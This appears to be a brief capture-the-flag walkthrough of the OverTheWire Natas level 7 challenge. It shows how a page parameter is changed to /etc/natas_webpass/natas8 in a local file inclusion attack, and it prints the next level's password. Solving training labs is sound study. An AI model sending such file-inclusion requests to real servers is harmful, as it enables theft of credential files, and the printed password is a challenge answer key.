

```html
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>
this is the front page

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
```
When ever I change Pages the link Changes

```plain
//From
http://natas7.natas.labs.overthewire.org/
//To
http://natas7.natas.labs.overthewire.org/index.php?page=home
```
It indicates LFI exploit

so lets change page=home to page=/etc/natas_webpass/natas8

Full URL : http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8

Below the output

```html
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>
DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
```
